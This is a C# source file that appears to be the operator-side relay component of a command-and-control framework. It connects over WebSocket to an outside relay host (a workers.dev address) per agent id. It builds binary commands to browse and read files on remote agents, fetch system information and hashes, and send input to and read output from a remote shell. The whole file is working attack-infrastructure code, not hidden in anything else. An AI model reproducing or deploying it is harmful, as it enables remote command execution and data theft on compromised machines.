using System.Net.WebSockets;
using System.Text;

namespace C2.Features.Relay;

public class RelaySocket
{
    private ClientWebSocket? _ws;
    private readonly SemaphoreSlim _sendLock = new(1, 1);

    public ClientWebSocket? WebSocket => _ws;
    public bool IsConnected => _ws is not null && _ws.State == WebSocketState.Open;
    public string? ConnectedAgentId { get; private set; }

    public string? BaseUrl { get; set; }

    public async Task Connect(string agentId, CancellationToken ct = default)
    {
        var baseUrl = (BaseUrl ?? "wss://relay.nostdlib.workers.dev").TrimEnd('/');
        _ws = new ClientWebSocket();
        await _ws.ConnectAsync(new Uri($"{baseUrl}/relay/{agentId}"), ct);
        ConnectedAgentId = agentId;
    }

    public async Task Disconnect()
    {
        if (_ws is not null)
        {
            try { await _ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None); } catch { }
            _ws.Dispose();
            _ws = null;
        }
        ConnectedAgentId = null;
    }

    public async Task<byte[]?> SendAndReceive(byte[] payload)
    {
        if (!IsConnected) return null;

        await _sendLock.WaitAsync();
        try
        {
            if (!IsConnected) return null;

            await _ws!.SendAsync(payload, WebSocketMessageType.Binary, true, CancellationToken.None);

            var buffer = new byte[65536];
            using var ms = new MemoryStream();
            WebSocketReceiveResult result;
            do
            {
                result = await _ws.ReceiveAsync(buffer, CancellationToken.None);
                ms.Write(buffer, 0, result.Count);
            } while (!result.EndOfMessage);

            return ms.ToArray();
        }
        finally
        {
            _sendLock.Release();
        }
    }

    // --- Binary protocol command builders ---

    /// <summary>Normalize path for the agent: if no drive letter, treat as Unix and ensure leading /.</summary>
    private static string NormalizePath(string path)
    {
        if (string.IsNullOrEmpty(path)) return path;
        var p = path.Replace('\\', '/');
        // If path has no drive letter (e.g. "C:"), it's Unix — ensure leading /
        if (p.Length > 0 && !p.Contains(':') && p[0] != '/')
            p = "/" + p;
        return p;
    }

    public static byte[] BuildPathCommand(byte cmd, string path)
    {
        var pathBytes = Encoding.Unicode.GetBytes(NormalizePath(path) + "\0");
        var payload = new byte[1 + pathBytes.Length];
        payload[0] = cmd;
        pathBytes.CopyTo(payload, 1);
        return payload;
    }

    public static byte[] BuildFileCommand(byte cmd, string path, long size, long offset)
    {
        var pathBytes = Encoding.Unicode.GetBytes(NormalizePath(path) + "\0");
        var payload = new byte[1 + 8 + 8 + pathBytes.Length];
        payload[0] = cmd;
        BitConverter.TryWriteBytes(payload.AsSpan(1), (ulong)size);
        BitConverter.TryWriteBytes(payload.AsSpan(9), (ulong)offset);
        pathBytes.CopyTo(payload, 17);
        return payload;
    }

    // --- Binary protocol response parsers ---

    public static uint ReadStatus(byte[] response) => BitConverter.ToUInt32(response, 0);

    public static Guid ReadUuid(byte[] response) => new(response.AsSpan(4, 16));

    // SystemInfo layout: UUID (16) + Hostname (256) + Architecture (32) + Platform (32) = 336 bytes
    // Response: UINT32 status + SystemInfo
    public const int SystemInfoOffset = 4;
    public const int SystemInfoSize = 16 + 256 + 32 + 32; // 336

    public static (Guid uuid, string hostname, string architecture, string platform) ReadSystemInfo(byte[] response)
    {
        var uuid = new Guid(response.AsSpan(SystemInfoOffset, 16));
        var hostname = ReadNullTerminatedString(response, SystemInfoOffset + 16, 256);
        var architecture = ReadNullTerminatedString(response, SystemInfoOffset + 16 + 256, 32);
        var platform = ReadNullTerminatedString(response, SystemInfoOffset + 16 + 256 + 32, 32);
        return (uuid, hostname, architecture, platform);
    }

    private static string ReadNullTerminatedString(byte[] data, int offset, int maxLength)
    {
        var end = offset + maxLength;
        if (end > data.Length) end = data.Length;
        var length = 0;
        for (var i = offset; i < end; i++)
        {
            if (data[i] == 0) break;
            length++;
        }
        return Encoding.ASCII.GetString(data, offset, length);
    }

    public static string ReadHash(byte[] response) => Convert.ToHexString(response.AsSpan(4, 32));

    public static (ulong bytesRead, byte[] data) ReadFileContent(byte[] response)
    {
        var bytesRead = BitConverter.ToUInt64(response, 4);
        var length = (int)Math.Min(bytesRead, (ulong)(response.Length - 12));
        var data = response.AsSpan(12, length);
        return (bytesRead, data.ToArray());
    }

    public static ulong ReadEntryCount(byte[] response) => BitConverter.ToUInt64(response, 4);

    // --- Shell commands (0x04 WriteShell, 0x05 ReadShell) ---

    public static byte[] BuildWriteShell(string input)
    {
        var inputBytes = Encoding.UTF8.GetBytes(input + "\0");
        var payload = new byte[1 + inputBytes.Length];
        payload[0] = 0x04;
        inputBytes.CopyTo(payload, 1);
        return payload;
    }

    public static byte[] BuildReadShell() => [0x05];

    public static (ulong bytesRead, string output) ReadShellOutput(byte[] response)
    {
        var bytesRead = BitConverter.ToUInt64(response, 4);
        var length = (int)Math.Min(bytesRead, (ulong)(response.Length - 12));
        if (length <= 0) return (bytesRead, "");
        var output = Encoding.UTF8.GetString(response, 12, length);
        return (bytesRead, output);
    }
}
